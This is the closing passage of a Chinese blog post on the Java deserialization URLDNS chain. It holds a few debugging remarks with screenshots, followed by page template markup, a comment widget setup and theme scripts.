+<p><img src="https://raw.githubusercontent.com/Dre4m017/Pic/main/Pic/image-20250731171737-702jc3u.png" srcset="/img/loading.gif" lazyload alt="image"></p>
+<p>到这里就已经是成功了</p>
+<p>为了更直接的看，在这里下个断点debug一下</p>
+<p><img src="https://raw.githubusercontent.com/Dre4m017/Pic/main/Pic/image-20250731202423-ok14olj.png" srcset="/img/loading.gif" lazyload alt="image"></p>
+<p>反序列化的时候调一下看看</p>
+<p><img src="https://raw.githubusercontent.com/Dre4m017/Pic/main/Pic/image-20250731202638-ce3cexd.png" srcset="/img/loading.gif" lazyload alt="image"></p>
+<p>当前这个状态hashcode是-1，代表我们-1赋值成功</p>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/Java%E5%AE%89%E5%85%A8/" class="category-chain-item">Java安全</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/Java%E5%AE%89%E5%85%A8/" class="print-no-link">#Java安全</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>JAVA安全之URLDNS链</div>
+      <div>http://example.com/post/java-secure-urldns-link-z2cryuz.html</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>Dre4m</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2025年7月30日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-cc-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/post/java-reflection-z1evhqq.html" title="Java反射">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">Java反射</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/post/cc1-chain-z1gjwa5.html" title="Java反序列化CC1链">
+                        <span class="hidden-mobile">Java反序列化CC1链</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+  
+  
+    <article id="comments" lazyload>
+      
+  <div id="valine"></div>
+  <script type="text/javascript">
+    Fluid.utils.loadComments('#valine', function() {
+      Fluid.utils.createScript('https://lib.baomitu.com/valine/1.5.1/Valine.min.js', function() {
+        var options = Object.assign(
+          {"appId":"vklZyGJHIw3vHy3PTGM92QOy-gzGzoHsz","appKey":"uiPwluTg2cOzOaF4R6Ljpxw4","path":"window.location.pathname","placeholder":"说点什么","avatar":"retro","meta":["nick","mail","link"],"requiredFields":[],"pageSize":10,"lang":"zh-CN","highlight":false,"recordIP":false,"serverURLs":"","emojiCDN":null,"emojiMaps":null,"enableQQ":false},
+          {
+            el: "#valine",
+            path: window.location.pathname
+          }
+        )
+        new Valine(options);
+        Fluid.utils.waitElementVisible('#valine .vcontent', () => {
+          var imgSelector = '#valine .vcontent img:not(.vemoji)';
+          Fluid.plugins.imageCaption(imgSelector);
+          Fluid.plugins.fancyBox(imgSelector);
+        })
+      });
+    });
+  </script>
+  <noscript>Please enable JavaScript to view the comments</noscript>
+
+
+    </article>
+  
+
+
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+    <div class="statistics">
+  
+  
+
+  
+    
+      <span id="leancloud-site-pv-container" style="display: none">
+        总访问量 
+        <span id="leancloud-site-pv"></span>
+         次
+      </span>
+    
+    
+      <span id="leancloud-site-uv-container" style="display: none">
+        总访客数 
+        <span id="leancloud-site-uv"></span>
+         人
+      </span>
+    
+    
+
+  
+
+</div>
+
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/5.0.0/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script defer src="/js/leancloud.js" ></script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
